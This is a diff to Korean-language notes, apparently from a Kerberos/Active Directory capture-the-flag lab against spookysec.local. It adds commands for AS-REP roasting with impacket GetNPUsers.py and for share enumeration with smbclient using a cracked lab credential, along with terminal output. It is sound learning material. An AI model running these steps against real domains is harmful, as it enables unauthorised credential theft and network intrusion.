@@ -357,6 +357,7 @@ cd impacket/examples
 python3 GetNPUsers.py spookysec.local/USERNAME -no-pass -dc-ip 10.10.206.91
 python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.206.91
 
+# backup 계정도 보통 권한이 높은 경우가 많으므로 확인 필요
 
 # get TGT
 
@@ -399,9 +400,31 @@ Session completed.
 
 apt install smbclient
 
-
 smbclient -k -L spookysec.local -U svc-admin%management2005
+
+# -k 옵션은 사라졌습니다. 대신 -U 옵션을 사용하여 사용자 이름과 비밀번호를 지정합니다.
 
 -L : 도메인 컨트롤러의 공유 목록을 나열합니다.
 -k : Kerberos 인증을 사용합니다.
 -U : 사용자 이름과 비밀번호를 지정합니다.
+
+smbclient -L spookysec.local -U svc-admin%management2005
+
+# smbclient SMB 공유에 접근
+
+┌──(impacket-env)─(kali㉿vbox)-[~/kerbrute]
+└─$ smbclient -L spookysec.local -U svc-admin%management2005
+
+Sharename Type Comment
+--------- ---- -------
+ADMIN$ Disk Remote Admin
+backup Disk
+C$ Disk Default share
+IPC$ IPC Remote IPC
+NETLOGON Disk Logon server share
+SYSVOL Disk Logon server share
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+
